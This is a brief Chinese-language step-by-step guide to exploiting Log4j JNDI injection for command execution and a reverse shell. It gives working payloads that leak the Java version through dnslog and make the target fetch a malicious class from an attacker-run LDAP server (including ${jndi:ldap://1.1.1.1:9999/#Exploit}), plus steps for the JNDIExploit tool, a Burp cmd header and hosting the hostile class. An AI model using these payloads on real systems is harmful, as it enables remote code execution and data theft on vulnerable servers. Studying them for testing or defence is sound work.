jndi进行命令执行，反弹shell：<https://blog.csdn.net/m0_74294234/article/details/137188160>



## 步骤1
1、打开页面使用${jndi:ldap\://dnslog}插入到表单中点击提交，然后查看dnslog\
![](https://img.kancloud.cn/a1/88/a1881ec3b5890974a493c59bb92a5d72_786x396.png)\
2、使用dnslog查看Java版本payload：

```
${jndi:ldap://${sys:java.version}.dnslog}
```

![](https://img.kancloud.cn/89/5a/895a9b0aa03b54711c4236569aa62542_768x155.png)\
3、使用burp抓包，发送到重放模块，并将get修改成post\
![](https://img.kancloud.cn/4e/52/4e52858e704c39ec0d044b3f8a0e1350_737x445.png)\
4、下载JNDIExploit工具，本地开启一个ldap服务\
JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar用java8运行
![](https://img.kancloud.cn/bd/fa/bdfa00547d5086a394a17cdfd818744e_726x45.png)\
5、将payload修改${jndi:ldap\://ldap地址:1389/Basic/TomcatEcho}，在包内添加cmd头加上想执行的命令 （注：如Basic不可用可换成tomcatbypass）\
![](https://img.kancloud.cn/fb/a0/fba047856b3c0404f54ea7fc215d2947_714x390.png)

## []()步骤2

1、首先在攻击者的服务器上搭建两个服务\
第一个：服务网站上放恶意的class类。\
![](https://img.kancloud.cn/8f/9a/8f9ade1fbe93a21fafa568e924571b76_814x294.png)\
开启ldap或者rmi等服务（笔者这里用ldap）\
2、攻击\
然后将漏洞请求发过去

```
${jndi:ldap://ip:port/#Exploit}  
${jndi:ldap://1.1.1.1:9999/#Exploit}
```

